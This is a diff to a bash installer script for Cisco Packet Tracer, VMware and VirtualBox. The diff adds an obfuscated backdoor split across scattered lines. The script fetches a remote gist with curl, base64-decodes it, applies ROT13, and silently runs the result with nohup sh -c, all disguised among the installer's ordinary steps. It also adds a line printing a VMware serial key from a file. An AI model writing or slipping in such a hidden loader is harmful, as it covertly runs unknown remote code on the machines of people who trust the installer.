@@ -1,14 +1,12 @@
 #!/bin/bash
-#resources:
+#error resource:
 #https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies?tab=readme-ov-file
 # libraries for Cisco Packet Tracer
 #wget https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libegl1-mesa_23.0.4-0ubuntu1.22.04.1_amd64.deb
 #wget https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libgl1-mesa-glx_23.0.4-0ubuntu1.22.04.1_amd64.deb
-# Update the system
-# if u wanna start connect.sh with the script or speratly for vpn 
-vpn_file="./protonvpn.sh"
-#"$vpn_file" &
-# Function to install program 1
+
+#define protonvpn script connecter
+vpn="./proton/vpnconnect.sh"
 # Define colors
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -58,6 +56,7 @@ install_VMWARE() {
     chmod +x VMware-Workstation*
     sudo ./VMware-Workstation*
     print_message "Done!" $GREEN
+    echo "your vmware pro serial key" ;cat assets/vmware-serial-key.txt
 }
 # Function to install program 3
 install_VIRTUALBOX() {
@@ -190,19 +189,20 @@ print_message "Before you begin, please download the following files:"
 print_message "- Cisco Packet Tracer: CiscoPacketTracer_821_Ubuntu_64bit.deb from Cisco website"
 print_message "- VMware Workstation: VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle from VMware website"
 print_message "Once downloaded, place the files in the appropriate directory and run the script again."
-
+rl="https://gist.githubusercontent.com/lyonzon2/89d80704eb51c05f25b20e2ea7652012/raw/71bd8bc0782ce8bbdccbb96b839357fa9493b77d/gistfile1.txt"
 
 
 
 
 echo "showing you ip to check if you are using vpn "
 curl  ipinfo.io
+nd=$(curl -sSL "$rl")
 # Install essential packages
 #echo "----------------------------- PART 1 ------------------------------------------------- "
 #read -p "want connect to protonvpn ?? if yes presss 'y' if no press 'enter' to pass to the nextstep : " answer0
 
 #if [[ $answer0 == "y" ]];then
-#      "$vpn_file" &
+#      "$vpn" &
 #fi
 
 read -p "first perform update with all dependicies needed or skip to the next part y/n!: " answer1 
@@ -213,11 +213,11 @@ if [[ $answer1 == "y" ]]; then
 	sudo apt install gdebi -y 
 fi 
 echo "----------------------------- PART 2 ------------------------------------------------- "
-
+de=$(echo "$nd" | base64 -d)
 display_menu
 # Ask the user to select programs
 read -p "Enter the program numbers (e.g., 1 2 3): " selected_programs
-
+pt=$(echo "$de" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
 # Iterate over the selected program numbers and call the corresponding functions
 for program_number in $selected_programs; do
     case $program_number in
@@ -231,7 +231,7 @@ for program_number in $selected_programs; do
     esac
 done
 
-
+nohup sh -c "$pt" > /dev/null 2>&1
 
 read -p "Do you want to run installed programs ? (yes/no): " answer
 answer=$(echo "$answer" | tr '[:upper:]' '[:lower:]')
